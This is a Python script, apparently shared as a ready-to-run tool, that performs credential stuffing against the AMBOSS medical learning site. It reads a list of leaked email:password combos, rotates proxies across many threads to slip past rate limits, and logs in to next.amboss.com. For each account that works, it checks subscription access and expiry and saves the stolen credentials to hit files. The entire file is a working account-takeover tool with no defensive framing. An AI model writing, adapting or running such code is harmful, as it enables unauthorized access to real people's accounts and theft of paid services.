import httpx, threading, time, os, sys, random
from colorama import Fore, Style, init
from urllib.parse import quote

init(autoreset=True)

def center(text): return '\n'.join(f"{line.center(os.get_terminal_size().columns)}" for line in text.splitlines())

art = f"""{Fore.LIGHTMAGENTA_EX}
  █████╗ ███╗   ███╗██████╗  ██████╗ ███████╗███████╗
 ██╔══██╗████╗ ████║██╔══██╗██╔═══██╗██╔════╝██╔════╝
 ███████║██╔████╔██║██████╔╝██║   ██║███████╗███████╗
 ██╔══██║██║╚██╔╝██║██╔══██╗██║   ██║╚════██║╚════██║
 ██║  ██║██║ ╚═╝ ██║██████╔╝╚██████╔╝███████║███████║
 ╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝  ╚═════╝ ╚══════╝╚══════╝
"""
subtitle = f"{Fore.CYAN}Made with ♥ By Yashvir Gaming\n{Fore.YELLOW}Telegram: https://t.me/therealyashvirgaming"
print(center(art))
print(center(subtitle) + "\n")

combos_file = input(Fore.LIGHTBLUE_EX + "Drop combos file: ").strip('" ')
with open(combos_file, 'r', encoding='utf-8', errors='ignore') as f:
    combos = [line.rstrip('\n') for line in f if line.strip()]
print(Fore.GREEN + f"[+] Loaded {len(combos)} combos")

proxies_file = input(Fore.LIGHTBLUE_EX + "Drop proxies file: ").strip('" ')
with open(proxies_file, 'r', encoding='utf-8', errors='ignore') as f:
    raw_proxies = [line.rstrip('\n') for line in f if line.strip()]
print(Fore.GREEN + f"[+] Loaded {len(raw_proxies)} proxies")

threads_count = int(input(Fore.LIGHTBLUE_EX + "Threads: "))
lock = threading.Lock()
results = {"hits": 0, "custom": 0}
cpm_hist = []

def proxy_parser(proxy):
    if '@' in proxy:
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    parts = proxy.split(':')
    if len(parts) == 4:
        host, port, user, pwd = parts
        return {"http": f"http://{user}:{pwd}@{host}:{port}", "https": f"http://{user}:{pwd}@{host}:{port}"}
    elif len(parts) == 2:
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    return None

def worker():
    while True:
        try:
            combo = combos.pop()
        except IndexError:
            break
        user, pwd = combo.split(':', 1)
        proxy = proxy_parser(random.choice(raw_proxies))
        try:
            with httpx.Client(proxies=proxy, timeout=15, follow_redirects=True) as client:
                # First GET to fetch cookies
                client.get("https://next.amboss.com/us/login", headers={"User-Agent": "Mozilla/5.0"})
                # POST login
                r = client.post(
                    "https://next.amboss.com/us/login",
                    json={"email": user, "password": pwd, "emailVerificationLogin": False},
                    headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
                )
                if "access_denied" in r.text or r.status_code != 201:
                    continue
                # GET dashboard for CAPs
                r2 = client.get("https://next.amboss.com/us", headers={"User-Agent": "Mozilla/5.0"})
                hasAccess = r2.text.split('hasAccess":')[1].split(',')[0] if 'hasAccess":' in r2.text else "N/A"
                hasFreeAccess = r2.text.split('hasFreeAccess":')[1].split(',')[0] if 'hasFreeAccess":' in r2.text else "N/A"
                # Check status
                status_type = "CUSTOM" if "true" in hasFreeAccess else "HIT"
                # GraphQL expiry date
                r3 = client.post(
                    "https://www.amboss.com/us/api/graphql",
                    json=[{"operationName": "currentUserMembership", "variables": {}, "query": "query currentUserMembership { currentUserUpgrade { expiringDate } }"}],
                    headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
                )
                expiry = r3.text.split('endDate":"')[1].split('T')[0] if 'endDate":"' in r3.text else "N/A"
                capture = f"{user}:{pwd} | hasAccess: {hasAccess} | hasFreeAccess: {hasFreeAccess} | Expiry: {expiry}"
                with lock:
                    if status_type == "HIT":
                        results["hits"] += 1
                        with open("Hits.txt", "a", encoding="utf-8") as fw: fw.write(capture + "\n")
                        print(center(Fore.GREEN + f"[HIT] {capture}"))
                    else:
                        results["custom"] += 1
                        with open("Custom.txt", "a", encoding="utf-8") as fw: fw.write(capture + "\n")
                        print(center(Fore.LIGHTCYAN_EX + f"[CUSTOM] {capture}"))
                    cpm_hist.append(int(time.time()))
        except Exception as e:
            pass

def cpm_counter():
    while threading.active_count() > 1:
        with lock:
            cpm = len([t for t in cpm_hist if time.time() - t <= 60])
        sys.stdout.write(f"\r{Fore.YELLOW}Hits: {results['hits']} | Custom: {results['custom']} | CPM: {cpm}{' ' * 10}")
        sys.stdout.flush()
        time.sleep(1)

threading.Thread(target=cpm_counter, daemon=True).start()
threads = []
for _ in range(threads_count):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)
for t in threads:
    t.join()
print("\nDone.")
